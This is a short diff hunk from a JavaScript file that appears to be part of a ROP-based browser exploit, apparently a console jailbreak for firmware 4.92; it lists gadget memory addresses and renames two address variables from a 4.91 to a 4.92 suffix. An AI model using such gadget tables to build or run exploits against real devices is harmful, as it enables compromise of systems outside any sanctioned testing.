@@ -935,8 +935,8 @@ var gadget_mod13_addr_492=0x336870; //store_r3 gadget
 var gadget_mod14_addr_492=0x633900; //load r3 dword
 var gadget_mod15_addr_492=0x39D038; //load r3 word
 var gadget_mod16_addr_492=0x4F732C; //set toc
-var ipf1_addr_491=0x6ebb78; 
-var ipf2_addr_491=0x507374; 
+var ipf1_addr_492=0x6ebb78; 
+var ipf2_addr_492=0x507374; 
 
 function hexh2bin(hex_val)
 {
